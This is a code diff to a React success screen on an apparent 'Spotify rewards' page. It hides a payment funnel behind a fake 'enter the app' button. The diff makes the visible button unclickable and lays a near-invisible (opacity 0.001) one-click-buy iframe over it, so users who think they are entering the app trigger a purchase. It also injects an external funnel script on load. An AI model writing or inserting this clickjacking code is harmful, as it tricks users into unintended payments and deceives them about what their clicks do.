@@ -89,6 +89,18 @@ function WelcomeScreen({ onComplete }: { onComplete: () => void }) {
 }
 
 function SuccessScreen() {
+  // Carrega dinamicamente o script da Digital Goat assim que a tela abre
+  useEffect(() => {
+    const scriptId = "digital-goat-funnel-script";
+    if (!document.getElementById(scriptId)) {
+      const script = document.createElement("script");
+      script.id = scriptId;
+      script.src = "https://app.digitalgoat.com.br/scripts/product-funnel.js";
+      script.async = true;
+      document.body.appendChild(script);
+    }
+  }, []);
+
   return (
     <div className="flex flex-col items-center px-7 pb-8 pt-8 text-center animate-fade-in-up">
       {/* Success badge */}
@@ -103,13 +115,25 @@ function SuccessScreen() {
         Tu registro se ha completado correctamente. Haz clic en el botón de abajo para entrar en la aplicación y reclamar tu saldo.
       </p>
 
-      <button
-        type="button"
-        onClick={() => window.location.assign("https://myspotifyrewards.vercel.app/app.html")}
-        className="mb-5 w-full rounded-full bg-[#1DB954] px-6 py-[18px] text-center font-sans text-[15.5px] font-extrabold uppercase leading-none tracking-[1px] text-black shadow-[0_4px_15px_rgba(29,185,84,0.3)] transition-all duration-150 hover:scale-[1.02] hover:bg-[#1ed760]"
-      >
-        Quiero conprar upsell
-      </button>
+      {/* Container do Botão com o One-Click Buy Invisível Sobreposto */}
+      <div className="relative mb-5 h-[56px] w-full overflow-hidden rounded-full">
+        {/* Botão Verde Visível do Design */}
+        <button
+          type="button"
+          className="pointer-events-none absolute inset-0 z-0 flex h-full w-full items-center justify-center rounded-full bg-[#1DB954] px-6 text-center font-sans text-[15.5px] font-extrabold uppercase leading-none tracking-[1px] text-black shadow-[0_4px_15px_rgba(29,185,84,0.3)] transition-all duration-150 hover:scale-[1.02] hover:bg-[#1ed760]"
+        >
+          ENTRAR EN LA APLICACIÓN
+        </button>
+
+        {/* Iframe da Digital Goat Sobreposto de Forma Invisível */}
+        <iframe
+          id="product-funnel-cmtknev9y037101ofjz20wu9l"
+          src="https://pay.digitalgoat.com.br/ext/funnel/cmtknev9y037101ofjz20wu9l"
+          frameBorder="0"
+          allowTransparency={true}
+          className="absolute inset-0 z-10 h-full w-full cursor-pointer opacity-[0.001]"
+        />
+      </div>
     </div>
   );
 }
